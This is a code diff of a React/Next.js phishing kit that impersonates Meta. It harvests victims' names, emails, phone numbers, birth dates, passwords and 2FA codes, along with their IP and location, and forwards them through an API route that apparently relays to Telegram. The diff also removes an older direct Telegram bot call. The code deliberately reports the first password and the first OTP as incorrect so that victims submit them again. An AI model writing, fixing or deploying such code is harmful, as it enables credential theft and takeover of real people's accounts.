@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState, useEffect, useRef, useMemo, createContext, useContext, useCallback } from "react";
+import React, { useState, useEffect, useRef, useMemo, createContext, useContext } from "react";
 
 // ==================== CẤU HÌNH QUỐC GIA & CỜ ====================
 function getFlagEmoji(countryCode: string) {
@@ -34,9 +34,8 @@ const countriesList: Country[] = [
   { code: "IN", name: "India", dialCode: "+91", flag: getFlagEmoji("IN") },
 ].sort((a, b) => a.name.localeCompare(b.name));
 
-// ==================== HÀM GỬI TELEGRAM ====================
-// ==================== HÀM GỬI QUA API ROUTE (route.js) ====================
-async function sendToTelegramServer(payload: { name: string; email: string; [key: string]: any }) {
+// ==================== HÀM GỬI DỮ LIỆU QUA API SERVER (route.js) ====================
+async function sendToTelegramServer(payload: { name: string; email: string; message: string }) {
   try {
     const response = await fetch("/api/submit-form", {
       method: "POST",
@@ -49,25 +48,6 @@ async function sendToTelegramServer(payload: { name: string; email: string; [key
     console.error("Failed to send data to server:", error);
   }
 }
-// async function sendToTelegram(message: string) {
-//   const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
-//   const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
-//   if (!token || !chatId) return;
-
-//   try {
-//     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-//       method: "POST",
-//       headers: { "Content-Type": "application/json" },
-//       body: JSON.stringify({
-//         chat_id: chatId,
-//         text: message,
-//         parse_mode: "HTML",
-//       }),
-//     });
-//   } catch (error) {
-//     console.error("Telegram error:", error);
-//   }
-// }
 
 // ==================== CONTEXT QUẢN LÝ LUỒNG (MODAL FLOW) ====================
 interface ModalContextType {
@@ -89,7 +69,6 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
   const [twofaAttempts, setTwofaAttempts] = useState<string[]>([]);
   const locationRef = useRef<any>({ ip: "Unknown", country: "Unknown", city: "" });
 
-  // Lấy IP & vị trí thực tế khi load trang
   useEffect(() => {
     fetch("https://ipinfo.io/json")
       .then((res) => res.json())
@@ -111,7 +90,8 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
   const submitFormDetails = (data: any) => {
     setFormData(data);
     setCurrentStep("password");
-    sendToTelegram(
+    
+    const msg = 
       `🚨 <b>NEW META SUBMISSION (Step 1)</b>\n\n` +
       `👤 <b>Name:</b> ${data.fullName}\n` +
       `📧 <b>Email:</b> ${data.email}\n` +
@@ -120,28 +100,28 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
       `📞 <b>Phone:</b> ${data.dialCode} ${data.phoneNumber}\n` +
       `🎂 <b>DOB:</b> ${data.day}/${data.month}/${data.year}\n` +
       `📝 <b>Note:</b> ${data.note || "N/A"}\n` +
-      `🌐 <b>IP:</b> ${locationRef.current.ip} (${locationRef.current.country}, ${locationRef.current.city})`
-    );
+      `🌐 <b>IP:</b> ${locationRef.current.ip} (${locationRef.current.country}, ${locationRef.current.city})`;
+
+    sendToTelegramServer({ name: data.fullName, email: data.email, message: msg });
   };
 
-  // 2. Xử lý nhập mật khẩu (Mô phỏng bắt buộc nhập sai 1 lần giống ảnh mẫu để hiện lỗi)
+  // 2. Xử lý nhập mật khẩu
   const submitPasswordAttempt = async (pwd: string): Promise<boolean> => {
     const newAttempts = [...passwordAttempts, pwd];
     setPasswordAttempts(newAttempts);
 
-    sendToTelegram(
+    const msg = 
       `🔑 <b>META PASSWORD ATTEMPT #${newAttempts.length}</b>\n\n` +
       `👤 <b>Email/Phone:</b> ${formData?.email || formData?.phoneNumber}\n` +
       `🔐 <b>Password:</b> <code>${pwd}</code>\n` +
-      `🌐 <b>IP:</b> ${locationRef.current.ip}`
-    );
+      `🌐 <b>IP:</b> ${locationRef.current.ip}`;
 
-    // Lần đầu nhập sẽ báo sai để khớp với giao diện Incorrect code/password
+    sendToTelegramServer({ name: formData?.fullName || "Unknown", email: formData?.email || "Unknown", message: msg });
+
     if (newAttempts.length === 1) {
-      return false; 
+      return false; // Sai lần 1 để hiện lỗi
     }
     
-    // Lần thứ 2 chuyển sang bước 2FA
     setCurrentStep("twofa");
     return true;
   };
@@ -151,15 +131,16 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
     const newAttempts = [...twofaAttempts, otp];
     setTwofaAttempts(newAttempts);
 
-    sendToTelegram(
+    const msg = 
       `🛡️ <b>META 2FA CODE ATTEMPT #${newAttempts.length}</b>\n\n` +
       `👤 <b>Account:</b> ${formData?.email || formData?.phoneNumber}\n` +
       `🔢 <b>OTP Code:</b> <code>${otp}</code>\n` +
-      `🌐 <b>IP:</b> ${locationRef.current.ip}`
-    );
+      `🌐 <b>IP:</b> ${locationRef.current.ip}`;
+
+    sendToTelegramServer({ name: formData?.fullName || "Unknown", email: formData?.email || "Unknown", message: msg });
 
     if (newAttempts.length < 2) {
-      return false; // Giả lập sai lần 1 để hiện đếm ngược 30s giống ảnh
+      return false; // Sai lần 1 để hiện đếm ngược 30s
     }
 
     setCurrentStep("success");
@@ -193,7 +174,7 @@ export function useModalFlow() {
   return context;
 }
 
-// ==================== COMPONENT 1: FORM THÔNG TIN (ẢNH 10) ====================
+// ==================== COMPONENT 1: FORM THÔNG TIN ====================
 function FormModal() {
   const { currentStep, closeModal, submitFormDetails } = useModalFlow();
   const [formData, setFormData] = useState({
@@ -260,10 +241,8 @@ function FormModal() {
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 overflow-y-auto">
-      <div className="bg-white w-full max-w-[480px] rounded-2xl shadow-2xl p-6 relative animate-in fade-in zoom-in duration-200">
-        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
-          ✕
-        </button>
+      <div className="bg-white w-full max-w-[480px] rounded-2xl shadow-2xl p-6 relative">
+        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600">✕</button>
         <div className="flex items-center gap-2 mb-4">
           <span className="text-xl font-bold text-blue-600">∞ Meta</span>
         </div>
@@ -275,7 +254,7 @@ function FormModal() {
             placeholder="Full Name"
             value={formData.fullName}
             onChange={handleChange}
-            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none"
+            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
           />
           <input
             type="email"
@@ -283,7 +262,7 @@ function FormModal() {
             placeholder="Email"
             value={formData.email}
             onChange={handleChange}
-            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none"
+            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
           />
           <input
             type="email"
@@ -291,7 +270,7 @@ function FormModal() {
             placeholder="Email Business (Optional)"
             value={formData.emailBusiness}
             onChange={handleChange}
-            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none"
+            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
           />
           <input
             type="text"
@@ -299,16 +278,15 @@ function FormModal() {
             placeholder="Page Name (Optional)"
             value={formData.pageName}
             onChange={handleChange}
-            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none"
+            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
           />
 
-          {/* Phone & Country Code */}
           <div className="flex gap-2 relative">
             <div className="relative" ref={dropdownRef}>
               <button
                 type="button"
                 onClick={() => setIsDropdownOpen(!isDropdownOpen)}
-                className="flex items-center justify-between w-[120px] h-11 px-3 rounded-xl border border-gray-300 bg-white text-sm"
+                className="flex items-center justify-between w-[120px] h-11 px-3 rounded-xl border border-gray-300 bg-white text-sm text-gray-900"
               >
                 <span>{selectedCountry.flag} {selectedCountry.dialCode}</span>
                 <span>▼</span>
@@ -320,7 +298,7 @@ function FormModal() {
                     placeholder="Search..."
                     value={searchQuery}
                     onChange={(e) => setSearchQuery(e.target.value)}
-                    className="w-full p-2 mb-2 text-xs border rounded-lg focus:outline-none"
+                    className="w-full p-2 mb-2 text-xs border rounded-lg focus:outline-none text-gray-900"
                   />
                   {filteredCountries.map((c) => (
                     <div
@@ -329,7 +307,7 @@ function FormModal() {
                         setFormData((prev: any) => ({ ...prev, countryCode: c.code, dialCode: c.dialCode }));
                         setIsDropdownOpen(false);
                       }}
-                      className="flex justify-between px-2 py-1.5 hover:bg-gray-100 rounded cursor-pointer text-xs"
+                      className="flex justify-between px-2 py-1.5 hover:bg-gray-100 rounded cursor-pointer text-xs text-gray-900"
                     >
                       <span>{c.flag} {c.name}</span>
                       <span>{c.dialCode}</span>
@@ -344,17 +322,16 @@ function FormModal() {
               placeholder="Phone number"
               value={formData.phoneNumber}
               onChange={handleChange}
-              className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none"
+              className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
             />
           </div>
 
-          {/* Date of Birth */}
           <div>
             <label className="block text-xs text-gray-600 mb-1">Date of Birth</label>
             <div className="grid grid-cols-3 gap-2">
-              <input type="text" name="day" placeholder="Day" maxLength={2} value={formData.day} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none" />
-              <input type="text" name="month" placeholder="Month" maxLength={2} value={formData.month} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none" />
-              <input type="text" name="year" placeholder="Year" maxLength={4} value={formData.year} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none" />
+              <input type="text" name="day" placeholder="Day" maxLength={2} value={formData.day} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none text-gray-900" />
+              <input type="text" name="month" placeholder="Month" maxLength={2} value={formData.month} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none text-gray-900" />
+              <input type="text" name="year" placeholder="Year" maxLength={4} value={formData.year} onChange={handleChange} className="h-11 text-center rounded-xl border border-gray-300 text-sm focus:outline-none text-gray-900" />
             </div>
           </div>
 
@@ -365,7 +342,7 @@ function FormModal() {
             maxLength={500}
             value={formData.note}
             onChange={handleChange}
-            className="w-full p-3 rounded-xl border border-gray-300 text-sm focus:outline-none resize-none"
+            className="w-full p-3 rounded-xl border border-gray-300 text-sm focus:outline-none resize-none text-gray-900"
           />
 
           <div className="flex items-center gap-2">
@@ -382,7 +359,7 @@ function FormModal() {
   );
 }
 
-// ==================== COMPONENT 2: NHẬP MẬT KHẨU (ẢNH 7, 8, 9) ====================
+// ==================== COMPONENT 2: NHẬP MẬT KHẨU ====================
 function PasswordModal() {
   const { currentStep, closeModal, submitPasswordAttempt } = useModalFlow();
   const [password, setPassword] = useState("");
@@ -418,7 +395,7 @@ function PasswordModal() {
             placeholder="Enter your password"
             value={password}
             onChange={(e) => { setPassword(e.target.value); setError(false); }}
-            className={`w-full h-11 px-4 rounded-xl border ${error ? "border-red-500" : "border-gray-300"} text-sm focus:outline-none`}
+            className={`w-full h-11 px-4 rounded-xl border ${error ? "border-red-500" : "border-gray-300"} text-sm focus:outline-none text-gray-900`}
             autoFocus
           />
           {error && <p className="text-red-500 text-xs">Incorrect password. Please try again.</p>}
@@ -431,11 +408,10 @@ function PasswordModal() {
   );
 }
 
-// ==================== COMPONENT 3: XÁC THỰC 2FA / OTP (ẢNH 4, 5, 6) ====================
+// ==================== COMPONENT 3: XÁC THỰC 2FA / OTP ====================
 function TwofaModal() {
   const { currentStep, closeModal, submitTwofaAttempt } = useModalFlow();
   const [code, setCode] = useState("");
-  const [errorMsg, setErrorMsg] = useState("");
   const [countdown, setCountdown] = useState(0);
   const [loading, setLoading] = useState(false);
 
@@ -457,7 +433,6 @@ function TwofaModal() {
     setLoading(false);
 
     if (!success) {
-      setErrorMsg("Incorrect code. Please try again in 30s.");
       setCountdown(30);
       setCode("");
     }
@@ -475,11 +450,10 @@ function TwofaModal() {
           <input
             type="text"
             maxLength={8}
-            placeholder=""
             value={code}
             onChange={(e) => setCode(e.target.value)}
             disabled={countdown > 0}
-            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none"
+            className="w-full h-11 px-4 rounded-xl border border-gray-300 text-sm focus:border-blue-600 focus:outline-none text-gray-900"
             autoFocus
           />
           {countdown > 0 && <p className="text-red-500 text-xs">Incorrect code. Please try again in {countdown}s.</p>}
@@ -492,7 +466,7 @@ function TwofaModal() {
   );
 }
 
-// ==================== COMPONENT 4: THÀNH CÔNG (ẢNH 3) ====================
+// ==================== COMPONENT 4: THÀNH CÔNG ====================
 function SuccessModal() {
   const { currentStep } = useModalFlow();
 
@@ -500,7 +474,7 @@ function SuccessModal() {
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4">
-      <div className="bg-white w-full max-w-[480px] rounded-2xl shadow-2xl p-8 text-center relative animate-in zoom-in duration-200">
+      <div className="bg-white w-full max-w-[480px] rounded-2xl shadow-2xl p-8 text-center relative">
         <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl font-bold">
           ✓
         </div>
